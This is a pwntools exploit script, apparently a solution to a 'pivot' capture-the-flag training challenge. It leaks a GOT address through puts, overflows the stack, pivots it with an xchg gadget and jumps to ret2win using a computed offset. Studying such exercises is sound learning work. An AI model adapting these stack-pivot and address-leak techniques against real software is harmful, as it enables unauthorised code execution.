#!/usr/bin/python3
import pwn
import sys
import time
binary = "pivot"
pwn.context.binary = binary
pwn.context.encoding = "latin"

'''
exploit:
    call foothold function to populate got
    call puts on new foothold function in order to leak value
    redirect back to main in order to send new rop chain which will call ret2win

    payload 1: (pivoted)
        resolve + leak

    payload 2: (pivoter)
        stack smash + stack pivot
        
    payload 3: (pivoter)
        nop

    payload 4: (pivoted)
        call ret2win with custom address
'''

gadgets = {
    "pop_rax_ret":0x4009bb,
    "xchg_rsp_rax":0x4009bd,
    "mov_rax_ptr_rax":0x4009c0,
    "add_rax_rbp":0x4009c4,
    "pop_rdi_ret":0x400a33,
    "foothold_function@plt":0x400720,
    "foothold_function@got":0x601040,
    "puts@plt":0x4006e0,
    "main":0x400847
}

padding = 40
lib_got_offset = 279
debug_script = ""

with open("debug.gdb", "r") as file_io:
    debug_script += file_io.read()

with pwn.process(binary) as io:

    io.recvuntil(": ")
    leak = io.recvline().strip()
    pwn.info(f"leak found {leak}")

    payload_1 = pwn.flat(
        pwn.p64(gadgets["foothold_function@plt"]),
        pwn.p64(gadgets["pop_rdi_ret"]),
        pwn.p64(gadgets["foothold_function@got"]),
        pwn.p64(gadgets["puts@plt"]),
        pwn.p64(gadgets["main"]),
        b"\n"
    ) 
    
    payload_2 = pwn.flat(
        b"A"*padding,
        pwn.p64(gadgets["pop_rax_ret"]),
        pwn.p64(int(leak.strip(), 16)),
        pwn.p64(gadgets["xchg_rsp_rax"])
    )

    payload_3 = pwn.flat(
        pwn.asm('nop'),
        b"\n"
    )

    io.send(payload_1)
    pwn.info(io.recv(4096))
    io.send(payload_2)

    for x in range(5):
        pwn.info(io.recvline())

    # make the leak left justified, and add null bytes if needed
    leak_foothold = io.recvline().strip().ljust(8,b'\x00')

    pwn.info(leak_foothold)
    pwn.info(f"Unpacked leak: {type(pwn.u64(leak_foothold))}")

    payload_4 = pwn.flat(
        b"A"*padding,
        pwn.p64(pwn.u64(leak_foothold) + lib_got_offset)
    )

    io.send(payload_3)
    pwn.info(io.recv(4096))
    io.send(payload_4)
    pwn.info(io.readrepeat(2))